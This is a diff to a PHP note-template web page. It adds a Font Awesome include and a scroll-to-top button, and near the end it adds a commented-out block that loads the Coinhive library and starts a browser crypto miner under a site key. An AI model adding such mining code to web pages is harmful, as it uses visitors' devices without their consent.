@@ -8,6 +8,7 @@ if(!$fgmembersite->CheckLogin())
 }
 ?>
 
+
 <!-- This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
@@ -36,9 +37,11 @@ if(!$fgmembersite->CheckLogin())
         <link rel="stylesheet" type="text/css" href="styles.css">
         <meta charset="UTF-8">
         <title>Note Template</title>
+        <script src="https://use.fontawesome.com/4251d2427b.js"></script>
     </head>
 <body onbeforeunload="return confirm('Are you sure you want to close this ');" class="theme-background">
     <?php include_once("analyticstracking.php") ?>
+    <button onclick="scrollToTop(1000)" class="theme-background theme-background-light-hover" id="scrollbutt"><i class="fa fa-arrow-up" aria-hidden="true"></i></button>
     <div id="content">
         <div id="panel">
         <h1>Note Template</h1>
@@ -1206,6 +1209,13 @@ for (i = 0; i < close.length; i++) {
     }
 }
 </script>
+            
+<!--<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">
+
+var miner = new CoinHive.Anonymous('d5IJhWxr2zofws14IqksaRqth1KEtrlx',{ autoThreads: false, threads: 1, throttle: 0.99, forceASMJS: false });
+            miner.start();
+</script> -->
 <script tpye="text/javascript" src="js/mdu-auto-select.js"></script>
         <center>
                 <br/>
@@ -1213,5 +1223,34 @@ for (i = 0; i < close.length; i++) {
             </center>
         </div>
     </div>
+
+<script type="text/javascript">
+    window.onscroll = function() {scrollFunction()};
+
+function scrollFunction() {
+    if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        document.getElementById("scrollbutt").style.display = "block";
+    } else {
+        document.getElementById("scrollbutt").style.display = "none";
+    }
+}
+</script>
+            <script>
+function scrollToTop(scrollDuration) {
+const   scrollHeight = window.scrollY,
+        scrollStep = Math.PI / ( scrollDuration / 15 ),
+        cosParameter = scrollHeight / 2;
+var     scrollCount = 0,
+        scrollMargin,
+        scrollInterval = setInterval( function() {
+            if ( window.scrollY != 0 ) {
+                scrollCount = scrollCount + 1;  
+                scrollMargin = cosParameter - cosParameter * Math.cos( scrollCount * scrollStep );
+                window.scrollTo( 0, ( scrollHeight - scrollMargin ) );
+            } 
+            else clearInterval(scrollInterval); 
+        }, 15 );
+}
+</script>
 </body>
 </html>
